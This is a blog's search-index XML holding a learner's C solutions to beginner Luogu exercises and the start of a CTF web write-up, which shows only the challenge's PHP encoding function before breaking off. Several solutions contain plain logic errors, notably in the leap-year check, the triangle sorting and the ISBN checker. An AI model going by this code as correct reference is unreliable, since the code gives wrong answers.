<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>算法学习-洛谷基础题</title>
    <link href="/2025/07/13/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E6%B4%9B%E8%B0%B7%E5%9F%BA%E7%A1%80%E9%A2%98/"/>
    <url>/2025/07/13/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E6%B4%9B%E8%B0%B7%E5%9F%BA%E7%A1%80%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p><strong>三角形面积</strong></p><p>关键：海伦公式</p><div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><span class="hljs-type">double</span> <span class="hljs-title function_">cacu</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b,<span class="hljs-type">double</span> c)</span>&#123;    <span class="hljs-type">double</span> p=<span class="hljs-number">0</span>;    p=<span class="hljs-number">0.5</span>*(a+b+c);    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">sqrt</span>(p*(p-a)*(p-b)*(p-c)));&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">double</span> a=<span class="hljs-number">0</span>,b=<span class="hljs-number">0</span>,c=<span class="hljs-number">0</span>,S=<span class="hljs-number">0</span>;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lf %lf %lf&quot;</span>,&amp;a,&amp;b,&amp;c);    S=cacu(a,b,c);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.1lf&quot;</span>,S);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-comment">// gcc 三角形面积.c -lm -o 三角形面积</span></code></pre></div><p><strong>对角线</strong></p><blockquote><p>两条对角线其实确定了四个点（可以这么理解）</p></blockquote><blockquote><p>四个顶点构成一个四边形</p></blockquote><blockquote><p>所以每个顶点由一个四边形造成</p></blockquote><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> a=<span class="hljs-number">0</span>,b=<span class="hljs-number">0</span>;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;a);    b=a*(a<span class="hljs-number">-1</span>)/<span class="hljs-number">2</span>*(a<span class="hljs-number">-2</span>)/<span class="hljs-number">3</span>*(a<span class="hljs-number">-3</span>)/<span class="hljs-number">4</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,b);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><em>小技巧 <code>b=a*(a-1)*(a-2)*(a-3)/24;</code> 改成 <code>b=a*(a-1)/2*(a-2)/3*(a-3)/4;</code></em></p><p><strong>数的性质</strong></p><p>一些数字可能拥有以下的性质：</p><p>性质 1：是偶数；<br>性质 2：大于 4 且不大于 12。<br>小A 喜欢这两个性质同时成立的数字；Uim 喜欢这至少符合其中一种性质的数字；八尾勇喜欢刚好有符合其中一个性质的数字；正妹喜欢不符合这两个性质的数字。</p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>&#123;    <span class="hljs-keyword">if</span>(num%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">if</span>(num&gt;<span class="hljs-number">4</span>&amp;&amp;num&lt;=<span class="hljs-number">12</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(num&gt;<span class="hljs-number">4</span>&amp;&amp;num&lt;=<span class="hljs-number">12</span>)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>,choice;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a);    choice=judge(a);    <span class="hljs-keyword">switch</span>(choice)&#123;        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1 1 0 0&quot;</span>); <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0 1 1 0&quot;</span>); <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0 0 0 1&quot;</span>);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>闰年判断</strong><br>输入一个年份（大于 1582 的整数 ），判断这一年是否是闰年，如果是输出 1，否则输出 0。</p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>&#123;    <span class="hljs-keyword">if</span>(num%<span class="hljs-number">4</span>==<span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">if</span>(num%<span class="hljs-number">400</span>==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(num%<span class="hljs-number">100</span>==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>,choice;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a);    choice=judge(a);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,choice);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>洛谷团队系统</strong></p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>,local,luogu;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a);    local=a*<span class="hljs-number">5</span>;    luogu=<span class="hljs-number">11</span>+<span class="hljs-number">3</span>*a;    <span class="hljs-keyword">if</span>(local&lt;=luogu) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Local&quot;</span>);    <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Luogu&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>肥胖问题</strong></p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">double</span> m,h,BMI;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lf %lf&quot;</span>,&amp;m,&amp;h);    BMI=m/(h*h);    <span class="hljs-keyword">if</span>(BMI&lt;<span class="hljs-number">18.5</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Underweight&quot;</span>);    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(BMI&gt;=<span class="hljs-number">18.5</span>&amp;&amp;BMI&lt;<span class="hljs-number">24</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Normal&quot;</span>);    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.6g\n&quot;</span>,BMI);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overweight&quot;</span>);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>三位数排序</strong><br>给出三个整数 a,b,c(0&lt;=a,b,c&lt;=100)a,b,c(0≤a,b,c≤100)，要求把这三位整数从小到大排序。</p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">int</span> m,h,n;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,&amp;m,&amp;h,&amp;n);    <span class="hljs-keyword">if</span> (m&gt;=h&amp;&amp;m&gt;=n&amp;&amp;h&gt;=n)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,n,h,m);    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (m&gt;=h&amp;&amp;m&gt;=n&amp;&amp;n&gt;=h)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,h,n,m);    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (h&gt;=m&amp;&amp;m&gt;=n&amp;&amp;h&gt;=n)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,n,m,h);    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n&gt;=m&amp;&amp;m&gt;h&amp;&amp;n&gt;=h)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,h,m,n);    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (h&gt;=m&amp;&amp;n&gt;m&amp;&amp;n&gt;=h)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,m,h,n);    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,m,n,h);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>月份天数</strong><br>输入年份和月份，输出这一年的这一月有多少天。需要考虑闰年</p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;    <span class="hljs-keyword">if</span>(a==<span class="hljs-number">1</span>||a==<span class="hljs-number">3</span>||a==<span class="hljs-number">5</span>||a==<span class="hljs-number">7</span>||a==<span class="hljs-number">8</span>|a==<span class="hljs-number">10</span>||a==<span class="hljs-number">12</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;31&quot;</span>);    <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;30&quot;</span>);&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">judge_run</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>&#123;    <span class="hljs-keyword">if</span>(num%<span class="hljs-number">4</span>==<span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">if</span>(num%<span class="hljs-number">400</span>==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(num%<span class="hljs-number">100</span>==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;    <span class="hljs-type">int</span> year,month,day;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;year,&amp;month);    <span class="hljs-keyword">if</span>(month==<span class="hljs-number">2</span>)&#123;        <span class="hljs-keyword">if</span>(judge_run(year))&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;29&quot;</span>);        &#125;        <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;28&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    judge(month);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>ISBN号码</strong><br>每一本正式出版的图书都有一个ISBN号码与之对应，ISBN码包括9位数字、1位识别码和3位分隔符，其规定格式如<code>x-xxx-xxxxx-x</code>，其中符号<code>-</code>就是分隔符（键盘上的减号），最后一位是识别码，例如<code>0-670-82162-4</code>就是一个标准的ISBN码。ISBN码的首位数字表示书籍的出版语言，例如0代表英语；第一个分隔符-之后的三位数字代表出版社，例如670代表维京出版社；第二个分隔符后的五位数字代表该书在该出版社的编号；最后一位为识别码。</p><p>识别码的计算方法如下：</p><p>首位数字乘以11加上次位数字乘以22……以此类推，用所得的结果mod11，所得的余数即为识别码，如果余数为10，则识别码为大写字母XX。例如ISBN号码0-670-82162-4中的识别码4是这样得到的：对067082162这9个数字，从左至右，分别乘以1,2,…,9再求和，即0×1+6×2+……+2×9=158然后取158mod11的结果4作为识别码。</p><p>你的任务是编写程序判断输入的ISBN号码中识别码是否正确，如果正确，则仅输出Right；如果错误，则输出你认为是正确的ISBN号码。</p><p>字符串转数字<br>需要库函数#include&lt;stdlib.h&gt;</p><p>● atof()：将字符串转换为双精度浮点型值。<br>● atoi()：将字符串转换为整型值。<br>● atol()：将字符串转换为长整型值。<br>● strtod()：将字符串转换为双精度浮点型值，并报告不能被转换的所有剩余数字。<br>● strtol()：将字符串转换为长整值，并报告不能被转换的所有剩余数字。<br>● strtoul()：将字符串转换为无符号长整型值，并报告不能被转换的所有剩余数字。</p><p>数字转字符串<br>● itoa()：将整型值转换为字符串。<br>● ltoa()：将长整型值转换为字符串。<br>● ultoa()：将无符号长整型值转换为字符串。<br>● gcvt()：将浮点型数转换为字符串，取四舍五入。<br>● ecvt()：将双精度浮点型值转换为字符串，转换结果中不包含十进制小数点。<br>● fcvt()：指定位数为转换精度，其余同ecvt()。</p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];    <span class="hljs-type">int</span> num[<span class="hljs-number">100</span>];    <span class="hljs-type">int</span> all=<span class="hljs-number">0</span>;    <span class="hljs-type">int</span> len;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,&amp;s);    len=<span class="hljs-built_in">strlen</span>(s);    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;        <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;-&#x27;</span>)            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;len-i;j++)&#123;                s[i+j]=s[i+j+<span class="hljs-number">1</span>];            &#125;    &#125;    len=<span class="hljs-built_in">strlen</span>(s);    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;        <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;X&#x27;</span>)&#123;            num[i]=<span class="hljs-number">10</span>;            <span class="hljs-keyword">continue</span>;        &#125;        <span class="hljs-type">char</span> m=s[i];        num[i]=atoi(&amp;m);    &#125;    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len<span class="hljs-number">-1</span>;i++)&#123;        all+=(i+<span class="hljs-number">1</span>)*num[i];    &#125;    <span class="hljs-keyword">if</span>(all%<span class="hljs-number">11</span>==num[len<span class="hljs-number">-1</span>])        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;right&quot;</span>);    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len<span class="hljs-number">-1</span>;i++)&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,num[i]);            <span class="hljs-keyword">if</span>(i==<span class="hljs-number">0</span>||i==<span class="hljs-number">3</span>||i==<span class="hljs-number">8</span>)&#123;                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-&quot;</span>);            &#125;        &#125;        <span class="hljs-keyword">if</span>(all%<span class="hljs-number">11</span>==<span class="hljs-number">10</span>)&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;X&quot;</span>);        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,all%<span class="hljs-number">11</span>);        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>小鱼的航程</strong></p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;  <span class="hljs-type">long</span> <span class="hljs-type">int</span> a1,b1,c;  <span class="hljs-type">int</span> a2,b2;  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a2);  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,&amp;a1);  b1=a1/<span class="hljs-number">7</span>;  b2=a1%<span class="hljs-number">7</span>;  c=b1*<span class="hljs-number">250</span>*<span class="hljs-number">5</span>;  <span class="hljs-keyword">if</span>((b2+a2)==<span class="hljs-number">6</span>)  &#123;  c=c+(b2<span class="hljs-number">-1</span>)*<span class="hljs-number">250</span>;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,c+<span class="hljs-number">250</span>);  &#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((b2+a2)&gt;<span class="hljs-number">6</span>)  &#123;  c=c+(b2<span class="hljs-number">-2</span>)*<span class="hljs-number">250</span>;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,c+<span class="hljs-number">250</span>);  &#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(b1==<span class="hljs-number">0</span>&amp;&amp;(((b2<span class="hljs-number">-1</span>)+a2)&gt;=<span class="hljs-number">6</span>)&amp;&amp;((b2<span class="hljs-number">-1</span>)+a2)&lt;=<span class="hljs-number">7</span>)  &#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,c+<span class="hljs-number">250</span>);&#125;  <span class="hljs-keyword">else</span>&#123;  c=c+(b2)*<span class="hljs-number">250</span>;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,c);  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>三角形分类</strong></p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><span class="hljs-type">int</span> a,b,c,a1,b1,c1;<span class="hljs-type">void</span> <span class="hljs-title function_">sorting</span><span class="hljs-params">()</span>&#123;    <span class="hljs-keyword">if</span>(a&gt;=b&amp;&amp;a&gt;=c)&#123;        a1=a;        <span class="hljs-keyword">if</span>(b&gt;=c)&#123;            b1=b;            c1=c;        &#125;        <span class="hljs-keyword">else</span>&#123;            b1=c;            c1=b;        &#125;    &#125;    <span class="hljs-keyword">if</span>(c&gt;=b&amp;&amp;c&gt;=a)&#123;        a1=c;        <span class="hljs-keyword">if</span>(b&gt;=a)&#123;            b1=b;            c1=b;        &#125;        <span class="hljs-keyword">else</span>&#123;            b1=a;            c1=a;        &#125;    &#125;&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,&amp;a,&amp;b,&amp;c);    sorting(a,b,c,a1,b1,c1);    <span class="hljs-keyword">if</span>(c1+b1&lt;a1||c1==<span class="hljs-number">0</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Not triangle&quot;</span>);    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span>((c1*c1+b1*b1)==a1*a1)&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Right triangle\n&quot;</span>);        &#125;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c1*c1+b1*b1)&lt;a1*a1)&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Obtuse triangle\n&quot;</span>);        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Acute triangle\n&quot;</span>);        &#125;        <span class="hljs-keyword">if</span>(c1==b1||b1==a1)&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Isosceles triangle\n&quot;</span>);        &#125;        <span class="hljs-keyword">if</span>(c1==b1&amp;&amp;b1==a1)&#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equ;ateral triangle\n&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>ABC</strong></p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><span class="hljs-type">int</span> a,b,c,a1,b1,c1;<span class="hljs-type">void</span> <span class="hljs-title function_">sorting</span><span class="hljs-params">()</span>&#123;    <span class="hljs-keyword">if</span>(a&gt;=b&amp;&amp;a&gt;=c)&#123;        a1=a;        <span class="hljs-keyword">if</span>(b&gt;=c)&#123;            b1=b;            c1=c;        &#125; <span class="hljs-keyword">else</span>&#123;            b1=c;            c1=b;        &#125;    &#125;    <span class="hljs-keyword">if</span>(b&gt;=a&amp;&amp;b&gt;=c)&#123;        a1=b;        <span class="hljs-keyword">if</span>(a&gt;=c)&#123;            b1=a;            c1=c;        &#125; <span class="hljs-keyword">else</span>&#123;            b1=c;            c1=a;        &#125;    &#125;    <span class="hljs-keyword">if</span>(c&gt;=b&amp;&amp;c&gt;=a)&#123;        a1=c;        <span class="hljs-keyword">if</span>(b&gt;=a)&#123;            b1=b;            c1=a;        &#125; <span class="hljs-keyword">else</span>&#123;            b1=a;            c1=b;        &#125;    &#125;&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<span class="hljs-type">char</span> n,m,l;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,&amp;a,&amp;b,&amp;c);    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c %c %c&quot;</span>,&amp;m,&amp;n,&amp;l);    sorting();   <span class="hljs-comment">// printf(&quot;%c-%c-%c-&quot;,m,n,l);</span>    <span class="hljs-comment">//printf(&quot;%d %d %d&quot;,a1,b1,c1);</span>    <span class="hljs-keyword">if</span>(m==<span class="hljs-string">&#x27;A&#x27;</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,c1);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(m==<span class="hljs-string">&#x27;B&#x27;</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,b1);    &#125; <span class="hljs-keyword">else</span>&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,a1);    &#125;    <span class="hljs-keyword">if</span>(n==<span class="hljs-string">&#x27;A&#x27;</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,c1);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n==<span class="hljs-string">&#x27;B&#x27;</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,b1);    &#125; <span class="hljs-keyword">else</span>&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,a1);    &#125;    <span class="hljs-keyword">if</span>(l==<span class="hljs-string">&#x27;A&#x27;</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,c1);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(l==<span class="hljs-string">&#x27;B&#x27;</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,b1);    &#125; <span class="hljs-keyword">else</span>&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,a1);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>Coding</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web康复训练-攻防世界Web2</title>
    <link href="/2025/07/12/Web%E5%BA%B7%E5%A4%8D%E8%AE%AD%E7%BB%83-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb2/"/>
    <url>/2025/07/12/Web%E5%BA%B7%E5%A4%8D%E8%AE%AD%E7%BB%83-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb2/</url>
    
    <content type="html"><![CDATA[<p>打开题目，给了以下代码：</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;    <span class="hljs-variable">$_o</span>=<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$str</span>);    <span class="hljs-comment">// echo $_o;</span>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;               <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)+<span class="hljs-number">1</span>;        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;       &#125;     <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_</span>)));&#125;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">/*</span><span 